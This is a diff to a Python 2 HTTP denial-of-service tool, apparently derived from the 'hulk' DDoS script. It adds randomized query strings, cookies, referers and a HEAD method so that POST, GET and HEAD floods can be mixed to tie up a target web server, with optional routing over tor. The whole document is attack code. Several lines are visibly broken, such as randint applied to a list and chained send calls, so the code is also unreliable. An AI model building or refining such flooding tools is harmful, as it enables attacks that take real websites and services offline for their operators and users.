@@ -126,6 +126,14 @@ def buildblock(self, size):
     _NUMERIC = range(48, 57)
     validChars = _LOWERCASE + _UPPERCASE + _NUMERIC
     return (out_str)
+def querystring(ammount=1):
+	queryString = []
+	for i in range(ammount):
+		key = buildblock(random.randint(3,10))
+		value = buildblock(random.randint(3,20))
+		element = "{0}={1}".format(key, value)
+		queryString.append(element)
+	return '&'.join(queryString)
 
 class httpPost(Thread):
     def __init__(self, host, port, tor):
@@ -153,23 +161,37 @@ class httpPost(Thread):
         self.socks.send("POST / HTTP/1.1\r\n"
                         "Host: %s\r\n"
                         "User-Agent: %s\r\n"
-                        "Cache-Control: no-cache\r\n"
                         "Connection: keep-alive\r\n"
-                        "Keep-Alive: %s\r\n"
-                        "Content-Length: %s\r\n"
-                        "Content-Type: application/x-www-form-urlencoded,multipart/form-data\r\n\r\n" %
-                        (self.host, random.choice(useragents), random.randint(5,300), random.randint(10000,1000000)))
-    def _send_http_get(self, pause=random.randint(5, 10)):
+                        "Referer: %s\r\n"
+                        "Cookie: %s\r\n"
+                        "Keep-Alive: %s\r\n" 
+                        "Content-Length: 99768\r\n"
+                        "Content-Type: application/x-www-form-urlencoded\r\n\r\n" % 
+                        (self.host, random.randint(useragents), random.randint(300, 894), random.choice(referers) + buildblock(random.randint(5,10)), querystring(random.randint(1, 5))))
+    def _send_http_get(self, pause=random.randint(5,10)):
         global stop_now
         self.socks.send("GET / HTTP/1.1\r\n"
+			            "Host: %s\r\n"
+			            "User-Agent: %s\r\n"
+			            "Connection: keep-alive\r\n"
+			            "Keep-Alive: %s\r\n"
+			            "Accept-Encoding: gzip\r\n"
+			            "Accept-Language: en\r\n"
+			            "Referer: %s\r\n"
+			            "Cookie: %s\r\n" %
+			            (self.host, random.choice(useragents), random.randint(300,894), random.choice(referers) + buildblock(random.randint(5,10)), querystring(random.randint(1, 5))))
+    def _send_http_head(self, pause=random.randint(5,10)):
+        global stop_now
+        self.socks.send("HEAD / HTTP/1.1\r\n"
                         "Host: %s\r\n"
                         "User-Agent: %s\r\n"
                         "Connection: keep-alive\r\n"
                         "Keep-Alive: %s\r\n"
-                        "Content-Length: %s\r\n"
-                        "Cache-Control: no-cache\r\n"
-                        "Window-Size: 0\r\n" %
-                        (self.host, random.choice(useragents), random.randint(5,300), random.randint(10000,1000000)))
+                        "Accept-Encoding: gzip\r\n"
+			            "Accept-Language: en\r\n"
+			            "Referer: %s\r\n"
+			            "Cookie: %s\r\n" %
+			            (self.host, random.choice(useragents), random.randint(300,894), random.choice(referers) + buildblock(random.randint(5,10)), querystring(random.randint(1, 5))))
         for i in range(0, 9999):
             if stop_now:
                 self.running = False
@@ -180,10 +202,10 @@ class httpPost(Thread):
                 '@', '#', '$', '%', '^', '&', '*', '(', ')', '-', '_', '"', ';', 'NULL', 'null', '\x00', '0xFFFFFFFF']
         p = random.choice(data)
         counts = [p, p * 2, p * 3, p * 4, p * 5, p * 6]
-        count = random.choice(counts)  # randomly sends 1-6 random data strings at a time ;)
+        count = random.choice(counts) 
         print term.BOL + term.UP + term.CLEAR_EOL + "Posting: %s" % count + term.NORMAL
         self.socks.send(count)(buildblock)(random.randint(3, 10)) + '=' + (buildblock)(
-            random.randint(3, 10))  # imported buildblocks from hulk(ddos)
+            random.randint(3, 10)) 
         time.sleep(random.uniform(0.1, 3))
 
         self.socks.close()
@@ -206,7 +228,7 @@ class httpPost(Thread):
 
             while self.running:
                 try:
-                    random.choice[(self._send_http_post(), self._send_http_get(), self._send_http_post() + self._send_http_get())]
+                    random.choice([self._send_http_post(), self._send_http_get(), self._send_http_head(), self._send_http_get()+self._send_http_post(), self._send_http_head()+self._send_http_post(), self._send_http_get()+self._send_http_head()])
                 except Exception, e:
                     if e.args[0] == 32 or e.args[0] == 104:
                         print term.BOL + term.UP + term.CLEAR_EOL + "Broken threads, restarting..." + term.NORMAL
